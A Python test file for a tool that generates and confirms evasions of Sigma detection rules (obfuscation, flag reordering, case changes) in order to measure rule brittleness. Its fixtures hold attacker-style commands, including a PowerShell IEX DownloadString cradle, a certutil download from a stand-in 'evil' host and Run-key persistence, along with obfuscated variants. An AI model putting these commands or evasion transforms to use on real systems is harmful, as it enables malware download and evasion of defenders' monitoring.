"""Stage 3 Phase 2, Part 2: validate the deterministic evasion transformer
on known-answer cases before trusting it - same discipline as every prior
harness/gate component (see mechanic/evasion.py's module docstring).

Three things are validated here:

  1. For each of the five Uetz techniques, at least one case where the
     hand-computed transformed literal is known in advance, confirming the
     transformer produces it (test_each_technique_produces_the_hand_computed_literal).

  2. The HARNESS, not the transformer, decides whether a candidate is a
     genuine evasion: a reordering candidate that really does stop the
     original rule firing is confirmed; a recoding candidate that the
     original rule (case-insensitive by default) still catches is
     correctly discarded, not silently trusted.

  3. A rule keyed on a protected/OS-defined literal (a Windows autorun
     registry path) yields NO candidate evasions at all - the field-category
     gate recognizes TargetObject isn't a command-line/process field before
     ever generating a fake candidate for the harness to have to reject.
"""

from pathlib import Path

import pytest

from mechanic import evasion, gate, verify

try:
    verify.find_rsigma_binary()
    _RSIGMA_AVAILABLE = True
    _RSIGMA_SKIP_REASON = ""
except verify.VerifyError as e:
    _RSIGMA_AVAILABLE = False
    _RSIGMA_SKIP_REASON = str(e)

_needs_rsigma = pytest.mark.skipif(not _RSIGMA_AVAILABLE, reason=_RSIGMA_SKIP_REASON)


def _write(tmp_path: Path, name: str, text: str) -> Path:
    p = tmp_path / name
    p.write_text(text)
    return p


# ---------------------------------------------------------------------------
# Part 2, item 1: hand-computed literal per technique - no RSigma needed,
# this is pure string-transform logic.
# ---------------------------------------------------------------------------


def test_each_technique_produces_the_hand_computed_literal():
    char_ins = evasion.generate_candidate_literals("CommandLine", "IEX (New-Object Net.WebClient).DownloadString")
    assert "I`E`X (New-Object Net.WebClient).DownloadString" in char_ins[evasion.TECHNIQUE_CHAR_INSERTION]

    synonym = evasion.generate_candidate_literals("CommandLine", "powershell.exe -enc SGVsbG8=")
    assert "powershell.exe -EncodedCommand SGVsbG8=" in synonym[evasion.TECHNIQUE_SYNONYM]

    omission = evasion.generate_candidate_literals("CommandLine", r"C:\Windows\System32\cmd.exe /c whoami")
    assert "cmd.exe /c whoami" in omission[evasion.TECHNIQUE_OMISSION]

    reordering = evasion.generate_candidate_literals("CommandLine", "certutil.exe -urlcache -f")
    assert "certutil.exe -f -urlcache" in reordering[evasion.TECHNIQUE_REORDERING]

    recoding = evasion.generate_candidate_literals("CommandLine", "whoami.exe")
    assert "WhOaMi.ExE" in recoding[evasion.TECHNIQUE_RECODING]


def test_recoding_also_applies_to_path_identity_fields_but_nothing_else_does():
    # Image is "path_identity", not "commandline" - only recoding is offered.
    cands = evasion.generate_candidate_literals("Image", r"\whoami.exe")
    assert set(cands.keys()) == {evasion.TECHNIQUE_RECODING}
    assert r"\WhOaMi.ExE" in cands[evasion.TECHNIQUE_RECODING]


def test_non_process_fields_get_no_candidates_at_all():
    """A raw IOC (DestinationIp) isn't shell-parsed and has no case to
    flip - the field-category gate excludes it before any technique runs,
    so there's nothing for the harness to have to discard."""
    assert evasion.generate_candidate_literals("DestinationIp", "203.0.113.77") == {}


# ---------------------------------------------------------------------------
# Rules reused across the harness-confirmation tests below.
# ---------------------------------------------------------------------------

R1_ORIGINAL = """
title: Suspicious Whoami Execution (fragile - filename only)
id: 720171d0-82d1-471f-9ff4-227b0984d197
status: test
logsource: {category: process_creation, product: windows}
detection:
    selection:
        Image|endswith: '\\\\whoami.exe'
    condition: selection
level: medium
tags: [attack.discovery, attack.t1033]
"""

R2_ORIGINAL = """
title: Suspicious CertUtil Download (fragile - exact flag order/spacing)
id: 267fe72b-7a16-4ec2-9751-324856f9e26d
status: test
logsource: {category: process_creation, product: windows}
detection:
    selection:
        Image|endswith: '\\\\certutil.exe'
        CommandLine|contains: 'certutil.exe -urlcache -f'
    condition: selection
level: high
tags: [attack.command-and-control, attack.t1105]
"""

REGISTRY_AUTORUN_RULE = """
title: Registry Run Key Autostart Entry (protected literal - evasion-transformer validation)
id: 6a6e6b1e-90b1-4c62-8ce5-9b2f9a111111
status: test
logsource: {category: registry_event, product: windows}
detection:
    selection:
        TargetObject|contains: 'CurrentVersion\\\\Run\\\\'
    condition: selection
level: medium
tags: [attack.persistence, attack.t1547.001]
"""


# ---------------------------------------------------------------------------
# Part 2, item 2a: the harness confirms a genuine evasion.
# ---------------------------------------------------------------------------


@_needs_rsigma
def test_reordering_candidate_confirmed_as_real_evasion_by_harness(tmp_path):
    r2 = _write(tmp_path, "r2_original.yml", R2_ORIGINAL)
    fragile, tier = evasion.fragile_atoms_for_rule(r2)
    assert tier == "Tool"
    cmdline_atom = next(a for a in fragile if a.field == "CommandLine")
    assert cmdline_atom.value == "certutil.exe -urlcache -f"

    template_event = {
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -f http://evil/a.exe a.exe",
    }
    variants = evasion.generate_evasions(cmdline_atom.field, cmdline_atom.value, template_event, techniques=[evasion.TECHNIQUE_REORDERING])
    reordered = next(v for v in variants if v.new_literal == "certutil.exe -f -urlcache")
    assert reordered.event["CommandLine"] == "certutil.exe -f -urlcache http://evil/a.exe a.exe"

    confirmed, discarded = evasion.confirm_real_evasions(r2, [reordered])
    assert discarded == []
    assert len(confirmed) == 1
    assert confirmed[0].outcome.status == "trusted"
    assert confirmed[0].outcome.fired is False


# ---------------------------------------------------------------------------
# Part 2, item 2b: the harness discards a candidate that doesn't really
# evade (Sigma matching is case-insensitive by default, so a case-toggled
# filename still fires the original rule - the transformer doesn't know
# that on its own; the harness does).
# ---------------------------------------------------------------------------


@_needs_rsigma
def test_recoding_candidate_correctly_discarded_when_original_still_fires(tmp_path):
    r1 = _write(tmp_path, "r1_original.yml", R1_ORIGINAL)
    fragile, tier = evasion.fragile_atoms_for_rule(r1)
    assert tier == "Tool"
    image_atom = fragile[0]
    assert image_atom.field == "Image" and image_atom.value == "\\whoami.exe"

    template_event = {"Image": "C:\\Windows\\System32\\whoami.exe"}
    variants = evasion.generate_evasions(image_atom.field, image_atom.value, template_event)
    # Image is path_identity - only recoding should have produced anything.
    assert {v.technique for v in variants} == {evasion.TECHNIQUE_RECODING}
    assert len(variants) == 2  # alternating-case + swapcase

    confirmed, discarded = evasion.confirm_real_evasions(r1, variants)
    assert confirmed == []
    assert len(discarded) == 2
    for d in discarded:
        assert "still fires" in d["reason"]


# ---------------------------------------------------------------------------
# Part 2, item 3: a protected/OS-defined literal yields no candidates at
# all - nothing for the harness to even have to reject.
# ---------------------------------------------------------------------------


def test_protected_registry_literal_yields_zero_candidates():
    import tempfile

    with tempfile.TemporaryDirectory() as td:
        p = Path(td) / "registry_autorun.yml"
        p.write_text(REGISTRY_AUTORUN_RULE)
        fragile, tier = evasion.fragile_atoms_for_rule(p)
        assert tier == "TTP"
        assert len(fragile) == 1
        atom = fragile[0]
        assert atom.field == "TargetObject"
        assert atom.reason == "windows_autorun_registry"
        candidates = evasion.generate_candidate_literals(atom.field, atom.value)
        assert candidates == {}


@_needs_rsigma
def test_protected_registry_literal_end_to_end_pipeline_produces_no_evasions(tmp_path):
    """Full pipeline (fragile_atoms_for_rule -> generate_evasions ->
    confirm_real_evasions) via the same convenience entrypoint gate
    condition 1 uses - confirms the empty result holds through the whole
    stack, not just the raw generator function in isolation."""
    reg = _write(tmp_path, "registry_autorun.yml", REGISTRY_AUTORUN_RULE)
    template_event = {"TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "Details": "C:\\Users\\Public\\evil.exe"}
    labeled, discarded, fragile, tier = evasion.generate_confirmed_evasions_for_rule(reg, template_event)
    assert tier == "TTP"
    assert labeled == []
    assert discarded == []  # nothing was even generated to discard


# ---------------------------------------------------------------------------
# Sanity: the end-to-end convenience wrapper's output type is what
# mechanic.gate expects.
# ---------------------------------------------------------------------------


@_needs_rsigma
def test_generate_confirmed_evasions_for_rule_returns_labeled_events(tmp_path):
    r2 = _write(tmp_path, "r2_original.yml", R2_ORIGINAL)
    template_event = {
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -f http://evil/a.exe a.exe",
    }
    labeled, discarded, fragile, tier = evasion.generate_confirmed_evasions_for_rule(r2, template_event)
    assert all(isinstance(le, gate.LabeledEvent) for le in labeled)
    assert all(le.kind == "evasion" for le in labeled)
    assert len(labeled) >= 1  # at least the confirmed reordering evasion
